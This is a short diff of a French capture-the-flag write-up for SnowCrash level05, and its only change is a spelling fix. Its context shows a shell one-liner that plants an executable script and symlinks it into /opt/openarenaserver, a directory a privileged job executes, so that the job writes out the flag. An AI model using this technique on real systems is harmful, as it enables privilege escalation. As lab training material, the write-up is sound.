@@ -29,7 +29,7 @@ Le programme va lire dans le répertoire /opt/openarenaserver et execute bash -x
 
 ### Exploitation
 
-Creons un fichier avec un lien symbolic :) et attendons un peu ...
+Creons un fichier avec un lien symbolique :) et attendons un peu ...
 
 ```
 level05@SnowCrash:~$ echo "getflag > /tmp/flag05" > /tmp/exploit05 ; chmod +x /tmp/exploit05 ; ln -s /tmp/exploit05 /opt/openarenaserver/pwn_flag05 ; ls -la /opt/openarenaserver/pwn_flag05 ; cat /tmp/flag05
